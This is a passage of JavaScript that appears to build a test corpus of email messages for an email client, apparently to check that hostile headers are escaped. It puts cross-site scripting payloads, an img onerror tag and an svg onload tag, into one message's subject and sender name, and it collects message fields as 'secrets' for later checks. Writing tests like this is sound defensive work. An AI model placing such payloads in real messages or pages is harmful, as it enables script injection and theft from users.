  if (last !== undefined) {
    const subject = `<img src=x onerror=${payload("headers", "subject")}> Hostile headers ${run}`;
    const fromName = `<svg onload=${payload("headers", "from")}> Mallory ${run}`;

    messages[messages.length - 1] = {
      ...last,
      subject,
      fromName,
      raw: last.raw
        .replace(`Subject: ${last.subject}`, `Subject: ${subject}`)
        .replace(mailbox(last.fromName, last.fromEmail), mailbox(fromName, last.fromEmail)),
    };
  }

  const secrets = messages.flatMap((item) => [
    item.subject,
    item.fromName,
    item.fromEmail,
    item.bodyWord,
    ...item.attachments.map((attachment) => attachment.content),
  ]);

  return {
    run,
    messages,
    secrets,
    get: (label) => {
      const found = messages.find((item) => item.label === label);

      if (found === undefined) throw new Error(`The corpus has no ${label} message`);

      return found;
    },
  };
}
